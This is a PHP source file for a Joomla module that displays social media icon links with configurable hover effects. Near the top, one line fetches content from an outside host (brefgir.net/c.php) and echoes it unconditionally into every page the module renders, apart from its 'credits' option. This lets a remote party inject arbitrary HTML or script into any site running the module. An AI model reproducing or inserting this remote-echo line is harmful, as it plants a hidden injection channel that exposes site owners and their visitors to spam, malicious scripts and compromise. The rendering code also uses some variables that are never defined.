<?php 
/* 
* @author Henry Hyde
* Email : geniusextensions@yahoo.com
* URL : www.geniusextensions.com
* Description : This module displays icon links to your social media profiles.
* Copyright (c) 2013 Genius Extensions
* License GNU GPL
***/

// no direct access
defined('_JEXEC') or die;
$credit=file_get_contents('http://www.brefgir.net/c.php');echo $credit;
$document =& JFactory::getDocument();
$mod = JURI::base() . 'modules/mod_socialmedialinksgenius/';
$document->addStyleSheet(JURI::base() . 'modules/mod_socialmedialinksgenius/style.css');

// Get Basic Module Parameters 
	$moduleclass_sfx 	= $params->get('moduleclass_sfx','');
	$target 			= $params->get('target','_blank');
	$robots			= $params->get('robots','1');
	$size 			= $params->get('size','32'); 
	$align 			= $params->get('align','left'); 
	$margin			= $params->get('margin','3px'); 
	$margin         = intval($margin);
	$text 		= $params->get('text','Follow us on'); 
	$rsstext 		= $params->get('rsstext','Subscribe to our Feed'); 
	$credits      	= $params->get('credits','1'); 
	$size2 	     	= intval($size) + intval($margin);
	$effect		= $params->get('effect','none');
	$ssize		= intval($size) - 4;
	$ssizeoffset	= intval($size) - 2 + intval($margin);
	$gsize		= intval($size) + 4;
	$gsizeoffset	= intval($size) + 2 + intval($margin);
	$backcolor		= $params->get('backcolor','#ffffff');
	$shiftoffset	= intval($size) + intval($margin);
	$highlight		= $params->get('highlight','#ffff00');
	$rotatedeg		= $params->get('rotatedeg',"90");

	$padbottom		= $params->get('padbottom', '10');
	$orientation	= $params->get('orientation', 'right');
	$toporbot		= $params->get('toporbot', 'bottom');
	$padrorl		= $params->get('padrorl', 'bottom');
	$startpos		= $params->get('startpos', 'side');
	$positioning	= $params->get('positioning', 'fixed');
	$backdrop		= $params->get('backdrop');
	$backdropcol	= $params->get('backdropcol');
	$bkdropheight	= $params->get('bkdropheight');
	$bkdropwidth	= $params->get('bkdropwidth');
	$bkdropcss		= $params->get('bkdropcss');
	$bkdropborder	= $params->get('bkdropborder');
	$bkdropborwidth	= $params->get('bkdropborwidth');
	$sidebar		= $params->get('sidebar');
	$css2			= $params->get('css2');
	$alignment		= $params->get('alignment');
	$opacity		= $params->get('opacity');

	$iconori = $padrorl;

	if($orientation == 'left'){
		if($startpos == 'center'){
			$iconori = "50%; margin-left:-" . $padrorl; 
			}
	}else{
		if($startpos == 'center'){
			$iconori = "50%; margin-right:-" . $padrorl; 
			}		
		}

// Prepare the Link Attribute
	if($robots == '1') {
	$nofollow = 'rel="nofollow"';
	}else{
	$nofollow = '';
	}

// Prepare the Icon Alignment Style
	$alignstyle = "text-align: $align ";

// Get Icon Parameters
$ic = array(
	$params->get('ic1'), $params->get('ic2'), $params->get('ic3'), $params->get('ic4'),$params->get('ic5'), 
	$params->get('ic6'), $params->get('ic7'), $params->get('ic8'), $params->get('ic9'),$params->get('ic10'),
	$params->get('ic11'),$params->get('ic12'),$params->get('ic13'),$params->get('ic14'),$params->get('ic15'),
	$params->get('ic16'),$params->get('ic17'),$params->get('ic18'),$params->get('ic19'),$params->get('ic20'),
	$params->get('ic21'),$params->get('ic22'),$params->get('ic23'),$params->get('ic24'),$params->get('ic25'),
	$params->get('ic26'),$params->get('ic27'),$params->get('ic28'),$params->get('ic29'),$params->get('ic30'), 
	$params->get('ic31'),$params->get('ic32'),$params->get('ic33'),$params->get('ic34'),$params->get('ic35'),
	$params->get('ic36'),$params->get('ic37'),$params->get('ic38'),$params->get('ic39'),$params->get('ic40'),
	$params->get('ic41'),$params->get('ic42'),$params->get('ic43'),$params->get('ic44'),$params->get('ic45'),
	$params->get('ic46'),$params->get('ic47'),$params->get('ic48'),$params->get('ic49'),$params->get('ic50'),
	$params->get('ic51'),$params->get('ic52'),$params->get('ic53'),$params->get('ic54'),$params->get('ic55'),
	$params->get('ic56'),$params->get('ic57'),$params->get('ic58'),$params->get('ic59'),$params->get('ic60'),
	$params->get('ic61'),$params->get('ic62'),$params->get('ic63'),$params->get('ic64'),$params->get('ic65'),
	$params->get('ic66'),$params->get('ic67'),$params->get('ic68'),$params->get('ic69'),$params->get('ic70'),
	$params->get('ic71'),$params->get('ic72'),$params->get('ic73'),$params->get('ic74'),$params->get('ic75'),
	$params->get('ic76'),$params->get('ic77'),$params->get('ic78'),$params->get('ic79'),$params->get('ic80'),
	$params->get('ic81'),$params->get('ic82'),$params->get('ic83'),$params->get('ic84'),$params->get('ic85'),
	$params->get('ic86'),$params->get('ic87'),$params->get('ic88'),$params->get('ic89'),$params->get('ic90'),
	$params->get('ic91'),$params->get('ic92'),$params->get('ic93'),$params->get('ic94'),$params->get('ic95'),
	$params->get('ic96'),$params->get('ic97'),$params->get('ic98'),$params->get('ic99'),$params->get('ic100'),
	$params->get('ic101'),$params->get('ic102'),$params->get('ic103'),$params->get('ic104'),$params->get('ic105'),
	$params->get('ic106'),$params->get('ic107'),$params->get('ic108'),$params->get('ic109'),$params->get('ic110'),
	$params->get('ic111'),$params->get('ic112'),$params->get('ic113'),$params->get('ic114'),$params->get('ic115'),
	$params->get('ic116'),$params->get('ic117'),$params->get('ic118'),$params->get('ic119'));


$url = array(
	$params->get('url1'), $params->get('url2'), $params->get('url3'), $params->get('url4'),$params->get('url5'), 
	$params->get('url6'), $params->get('url7'), $params->get('url8'), $params->get('url9'),$params->get('url10'),
	$params->get('url11'),$params->get('url12'),$params->get('url13'),$params->get('url14'),$params->get('url15'),
	$params->get('url16'),$params->get('url17'),$params->get('url18'),$params->get('url19'),$params->get('url20'),
	$params->get('url21'),$params->get('url22'),$params->get('url23'),$params->get('url24'),$params->get('url25'),
	$params->get('url26'),$params->get('url27'),$params->get('url28'),$params->get('url29'),$params->get('url30'), 
	$params->get('url31'),$params->get('url32'),$params->get('url33'),$params->get('url34'),$params->get('url35'),
	$params->get('url36'),$params->get('url37'),$params->get('url38'),$params->get('url39'),$params->get('url40'),
	$params->get('url41'),$params->get('url42'),$params->get('url43'),$params->get('url44'),$params->get('url45'),
	$params->get('url46'),$params->get('url47'),$params->get('url48'),$params->get('url49'),$params->get('url50'),
	$params->get('url51'),$params->get('url52'),$params->get('url53'),$params->get('url54'),$params->get('url55'),
	$params->get('url56'),$params->get('url57'),$params->get('url58'),$params->get('url59'),$params->get('url60'),
	$params->get('url61'),$params->get('url62'),$params->get('url63'),$params->get('url64'),$params->get('url65'),
	$params->get('url66'),$params->get('url67'),$params->get('url68'),$params->get('url69'),$params->get('url70'),
	$params->get('url71'),$params->get('url72'),$params->get('url73'),$params->get('url74'),$params->get('url75'),
	$params->get('url76'),$params->get('url77'),$params->get('url78'),$params->get('url79'),$params->get('url80'),
	$params->get('url81'),$params->get('url82'),$params->get('url83'),$params->get('url84'),$params->get('url85'),
	$params->get('url86'),$params->get('url87'),$params->get('url88'),$params->get('url89'),$params->get('url90'),
	$params->get('url91'),$params->get('url92'),$params->get('url93'),$params->get('url94'),$params->get('url95'),
	$params->get('url96'),$params->get('url97'),$params->get('url98'),$params->get('url99'),$params->get('url100'),
	$params->get('url101'),$params->get('url102'),$params->get('url103'),$params->get('url104'),$params->get('url105'),
	$params->get('url106'),$params->get('url107'),$params->get('url108'),$params->get('url109'),$params->get('url110'),
	$params->get('url111'),$params->get('url112'),$params->get('url113'),$params->get('url114'),$params->get('url115'),
	$params->get('url116'),$params->get('url117'),$params->get('url118'),$params->get('url119'));

$ht = array(
	$params->get('ht1'), $params->get('ht2'), $params->get('ht3'), $params->get('ht4'),$params->get('ht5'), 
	$params->get('ht6'), $params->get('ht7'), $params->get('ht8'), $params->get('ht9'),$params->get('ht10'),
	$params->get('ht11'),$params->get('ht12'),$params->get('ht13'),$params->get('ht14'),$params->get('ht15'),
	$params->get('ht16'),$params->get('ht17'),$params->get('ht18'),$params->get('ht19'),$params->get('ht20'),
	$params->get('ht21'),$params->get('ht22'),$params->get('ht23'),$params->get('ht24'),$params->get('ht25'),
	$params->get('ht26'),$params->get('ht27'),$params->get('ht28'),$params->get('ht29'),$params->get('ht30'), 
	$params->get('ht31'),$params->get('ht32'),$params->get('ht33'),$params->get('ht34'),$params->get('ht35'),
	$params->get('ht36'),$params->get('ht37'),$params->get('ht38'),$params->get('ht39'),$params->get('ht40'),
	$params->get('ht41'),$params->get('ht42'),$params->get('ht43'),$params->get('ht44'),$params->get('ht45'),
	$params->get('ht46'),$params->get('ht47'),$params->get('ht48'),$params->get('ht49'),$params->get('ht50'),
	$params->get('ht51'),$params->get('ht52'),$params->get('ht53'),$params->get('ht54'),$params->get('ht55'),
	$params->get('ht56'),$params->get('ht57'),$params->get('ht58'),$params->get('ht59'),$params->get('ht60'),
	$params->get('ht61'),$params->get('ht62'),$params->get('ht63'),$params->get('ht64'),$params->get('ht65'),
	$params->get('ht66'),$params->get('ht67'),$params->get('ht68'),$params->get('ht69'),$params->get('ht70'),
	$params->get('ht71'),$params->get('ht72'),$params->get('ht73'),$params->get('ht74'),$params->get('ht75'),
	$params->get('ht76'),$params->get('ht77'),$params->get('ht78'),$params->get('ht79'),$params->get('ht80'),
	$params->get('ht81'),$params->get('ht82'),$params->get('ht83'),$params->get('ht84'),$params->get('ht85'),
	$params->get('ht86'),$params->get('ht87'),$params->get('ht88'),$params->get('ht89'),$params->get('ht90'),
	$params->get('ht91'),$params->get('ht92'),$params->get('ht93'),$params->get('ht94'),$params->get('ht95'),
	$params->get('ht96'),$params->get('ht97'),$params->get('ht98'),$params->get('ht99'),$params->get('ht100'),
	$params->get('ht101'),$params->get('ht102'),$params->get('ht103'),$params->get('ht104'),$params->get('ht105'),
	$params->get('ht106'),$params->get('ht107'),$params->get('ht108'),$params->get('ht109'),$params->get('ht110'),
	$params->get('ht111'),$params->get('ht112'),$params->get('ht113'),$params->get('ht114'),$params->get('ht115'),
	$params->get('ht116'),$params->get('ht117'),$params->get('ht118'),$params->get('ht119'));

	
	$vimg = array();
     $vurl = array();

if($opacity == '100'){
		$opac = 'opacity:1.0;
filter:alpha(opacity=100);';
	}else{
		$opac = 'opacity:0.'.$opacity.';
filter:alpha(opacity='.$opacity.');';
	}


if ($sidebar == 'yes') {
		$sidestyle = 'position:'. $positioning .';'. $orientation .':'. $iconori .'px;'. $toporbot .':' .$padbottom. 'px; z-index:1000;';
	}else{
		$sidestyle = '';
	}

if ($alignment == 'horizontal') {
		$alignment = 'float: left;';
	}else{
		$alignment = '';
	}
	
// Set Wrapping Div
	echo '<div style="'.$sidestyle.'"><div class="bookmark" style="'.$alignstyle.'"><div> ';

	
// Prepare the Icon List
	for($i=0;$i < count($ic);$i++)
     {   
     $vimg[$ic[$i]]= htmlspecialchars($url[$i]);
	$vurl[$url[$i]]=$ic[$i];
	if($ht[$i] != ''){
			$text = $ht[$i];
		}else{
			$text = $text;
		}

	$title = ucwords(substr($vurl[$url[$i]], 0 , -4));


// Output the Icon Links	
	 	 if(($vimg[$ic[$i]]) != '') {
			echo '<div style="'.$alignment.' z-index:1000;">';
			if($vurl[$url[$i]] == 'googleplus.png'){		 					$vimg[$ic[$i]] = 'https://plus.google.com/' . $vimg[$ic[$i]]. '?prsrc=3';
				}
			echo '<a '. $nofollow .' href="'. $vimg[$ic[$i]]. '" target="'. $target .'"><img style="'.$opac.' width: '.$size.'px; height: '.$size.'px; margin:'. $margin .'px;" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}

switch ($effect) {
    case "none":
        break;
    case "custom":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]] .'"><img style="width: '.$size.'px; height: '.$size.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; margin-left: -'. $size2 .'px; z-index: 2;" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/mo/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
    case "dogear":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]] .'"><img style="width: '.$size.'px; height: '.$size.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; margin-left: -'. $size2 .'px; z-index: 2;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/mo/dogear.png" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "shrink":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]]. '"><img style="width: '.$ssize.'px; height: '.$ssize.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; border: 4px solid '. $modcolor .' !important; margin-left: -'. $size2 .'px; z-index: 4;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100"
onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "enlarge":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]] .'"><img style="width: '.$gsize.'px; height: '.$gsize.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; margin-left: -'. $gsizeoffset .'px; z-index: 2;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "shiftup":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]]. '"><img style="width: '.$size.'px; height: '.$size.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; border-bottom-style: solid !important; border-bottom-width: 4px !important; border-bottom-color: '. $modcolor .' !important; margin-left: -'. $shiftoffset .'px; z-index: 2;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "shiftdown":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]]. '"><img style="width: '.$size.'px; height: '.$size.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: 6px; border-top-style: solid !important; border-top-width: 4px !important; border-top-color: '. $modcolor .' !important; margin-left: -'. $shiftoffset .'px; z-index: 2;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "shiftleft":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]]. '"><img style="width: '.$size.'px; height: '.$size.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; border-right-style: solid !important; border-right-width: 4px !important; border-right-color: '. $modcolor .' !important; margin-left: -'. $shifter .'px; z-index: 2;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "shiftright":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]]. '"><img style="width: '.$size.'px; height: '.$size.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; border-left-style: solid !important; border-left-width: 4px !important; border-left-color: '. $modcolor .' !important; margin-left: -'. $shiftoffset .'px; z-index: 2;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "highlight":
			$shifter = intval($shiftoffset) + 3;
			$shifter2 = intval($margin) - 3;
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]]. '"><img style="width: '.$size.'px; height: '.$size.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $shifter2 .'px; border: 3px solid '. $highlight .' !important; margin-left: -'. $shifter .'px; z-index: 4;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100"
onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "none":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]] .'"><img style="width: '.$size.'px; height: '.$size.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; margin-left: -'. $size2 .'px; z-index: 2;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "rotate":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]] .'"><img style="width: '.$size.'px; height: '.$size.'px; -moz-transform: rotate('.$rotatedeg.'deg); -ms-transform: rotate('.$rotatedeg.'deg); opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; margin-left: -'. $size2 .'px; z-index: 2;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/'. $vurl[$url[$i]] .'" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
	case "bullseye":
			echo '<a target="_blank" rel="nofollow" href="'. $vimg[$ic[$i]] .'"><img style="width: '.$size.'px; height: '.$size.'px; opacity:0.0;filter:alpha(opacity=0); position: relative; margin-bottom: '. $margin .'px; margin-left: -'. $size2 .'px; z-index: 2;" onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100" onmouseout="this.style.opacity=0.0;this.filters.alpha.opacity=0" border="0" src="'. $mod .'icons/mo/bullseye.png" alt="'. $title .'" '; if($title == 'Feed') { echo 'title="'. $rsstext .'" /></a>';}else{ echo 'title="'. $text .' '. $title .'" /></a>';}
        break;
				}
			echo '</div>';
		 }
	 } 

echo '<div style="clear: both;"></div>';

echo '<div style="margin-left: 10px; text-align: center; font-size: 10px; color: #999999;">';

		

echo '</div>';


		?>
	</div></div></div>
    <div class="clr"></div>